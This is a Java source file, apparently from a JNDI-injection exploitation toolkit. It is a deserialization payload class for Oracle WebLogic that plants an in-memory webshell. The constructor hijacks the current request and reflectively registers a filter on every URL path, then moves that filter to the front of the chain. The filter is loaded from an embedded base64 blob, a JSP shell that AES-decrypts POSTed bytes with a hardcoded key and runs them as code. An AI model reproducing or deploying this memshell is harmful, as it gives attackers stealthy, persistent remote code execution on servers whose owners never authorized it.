package com.nu1r.jndi.template.Weblogic;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.utils.collections.MatchMap;
import weblogic.work.ExecuteThread;
import weblogic.work.WorkAdapter;
import weblogic.xml.util.StringInputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

import static org.fusesource.jansi.Ansi.ansi;

public class WeblogicMemshellTemplate2 extends AbstractTranslet {
    public WeblogicMemshellTemplate2(){
        try{
            WorkAdapter adapter = ((ExecuteThread)Thread.currentThread()).getCurrentWork();
            if(adapter.getClass().getName().endsWith("ServletRequestImpl")){
                ServletResponseImpl res = (ServletResponseImpl) adapter.getClass().getMethod("getResponse").invoke(adapter);
                try{
                    injectShell(adapter);
                    res.getServletOutputStream().writeStream(new StringInputStream("[+] Memshell Inject Success"));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }catch(Exception e){
                    res.getServletOutputStream().writeStream(new StringInputStream("[-] Memshell Inject Failed"));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }else{
                Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
                ServletResponseImpl res = (ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
                try{
                    injectShell(obj);
                    res.getServletOutputStream().writeStream(new StringInputStream("[+] Memshell Inject Success"));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }catch(Exception e){
                    res.getServletOutputStream().writeStream(new StringInputStream("[-] Memshell Inject Failed"));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public void injectShell(Object request){
        try {
            String filterName = "WeblogicDynamicFilter-2";
            String urlPattern = "/*";

            Field contextField = request.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            WebAppServletContext servletContext = (WebAppServletContext) contextField.get(request);
            FilterManager filterManager = servletContext.getFilterManager();

            // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
            if (!filterManager.isFilterRegistered(filterName)) {
                System.out.println( ansi().render("@|green [+] Add Dynamic Filter|@"));

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                try{
                    clazz = cl.loadClass("com.nu1r.jndi.template.DynamicFilterTemplate");
                }catch(ClassNotFoundException e){
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qIiAlPg0KPCUhDQogICAgcHJpdmF0ZSBieXRlW10gRGVjcnlwdChieXRlW10gZGF0YSkgdGhyb3dzIEV4Y2VwdGlvbg0KICAgIHsNCiAgICAgICAgU3RyaW5nIGs9ImY5MGVjNmZhNDdhZjRiZGEiOw0KICAgICAgICBqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTL0VDQi9QS0NTNVBhZGRpbmciKTtjLmluaXQoMixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTsNCiAgICAgICAgYnl0ZVtdIGRlY29kZWJzOw0KICAgICAgICBDbGFzcyBiYXNlQ2xzIDsNCiAgICAgICAgICAgICAgICB0cnl7DQogICAgICAgICAgICAgICAgICAgIGJhc2VDbHM9Q2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOw0KICAgICAgICAgICAgICAgICAgICBPYmplY3QgRGVjb2Rlcj1iYXNlQ2xzLmdldE1ldGhvZCgiZ2V0RGVjb2RlciIsIG51bGwpLmludm9rZShiYXNlQ2xzLCBudWxsKTsNCiAgICAgICAgICAgICAgICAgICAgZGVjb2RlYnM9KGJ5dGVbXSkgRGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW117Ynl0ZVtdLmNsYXNzfSkuaW52b2tlKERlY29kZXIsIG5ldyBPYmplY3RbXXtkYXRhfSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoIChUaHJvd2FibGUgZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGJhc2VDbHMgPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7DQogICAgICAgICAgICAgICAgICAgIE9iamVjdCBEZWNvZGVyPWJhc2VDbHMubmV3SW5zdGFuY2UoKTsNCiAgICAgICAgICAgICAgICAgICAgZGVjb2RlYnM9KGJ5dGVbXSkgRGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlQnVmZmVyIixuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoRGVjb2RlciwgbmV3IE9iamVjdFtde25ldyBTdHJpbmcoZGF0YSl9KTsNCg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGMuZG9GaW5hbChkZWNvZGVicyk7DQoNCiAgICB9DQolPg0KPCUhY2xhc3MgVSBleHRlbmRzIENsYXNzTG9hZGVye1UoQ2xhc3NMb2FkZXIgYyl7c3VwZXIoYyk7fXB1YmxpYyBDbGFzcyBnKGJ5dGUgW11iKXtyZXR1cm4NCiAgICAgICAgc3VwZXIuZGVmaW5lQ2xhc3MoYiwwLGIubGVuZ3RoKTt9fSU+PCVpZiAocmVxdWVzdC5nZXRNZXRob2QoKS5lcXVhbHMoIlBPU1QiKSl7DQogICAgICAgICAgICBCeXRlQXJyYXlPdXRwdXRTdHJlYW0gYm9zID0gbmV3IEJ5dGVBcnJheU91dHB1dFN0cmVhbSgpOw0KICAgICAgICAgICAgYnl0ZVtdIGJ1ZiA9IG5ldyBieXRlWzUxMl07DQogICAgICAgICAgICBpbnQgbGVuZ3RoPXJlcXVlc3QuZ2V0SW5wdXRTdHJlYW0oKS5yZWFkKGJ1Zik7DQogICAgICAgICAgICB3aGlsZSAobGVuZ3RoPjApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYnl0ZVtdIGRhdGE9IEFycmF5cy5jb3B5T2ZSYW5nZShidWYsMCxsZW5ndGgpOw0KICAgICAgICAgICAgICAgIGJvcy53cml0ZShkYXRhKTsNCiAgICAgICAgICAgICAgICBsZW5ndGg9cmVxdWVzdC5nZXRJbnB1dFN0cmVhbSgpLnJlYWQoYnVmKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgbmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoRGVjcnlwdChib3MudG9CeXRlQXJyYXkoKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9DQolPg==";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                }

                //将 Filter 注册进 FilterManager
                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterMethod.setAccessible(true);
                registerFilterMethod.invoke(filterManager, filterName, "com.feihong.ldap.template.DynamicFilterTemplate", new String[]{urlPattern}, null, null, null);


                //将我们添加的 Filter 移动到 FilterChian 的第一位
                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
                filterPatternListField.setAccessible(true);
                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);


                //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
                for(int i = 0; i < filterPatternList.size(); i++){
                    Object filterPattern = filterPatternList.get(i);
                    Field f = filterPattern.getClass().getDeclaredField("map");
                    f.setAccessible(true);
                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);

                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
                    f.setAccessible(true);
                    MatchMap matchMap = (MatchMap)f.get(mapping);

                    Object result = matchMap.match(urlPattern);
                    if(result != null && result.toString().contains(urlPattern)){
                        Object temp = filterPattern;
                        filterPatternList.set(i, filterPatternList.get(0));
                        filterPatternList.set(0, temp);
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
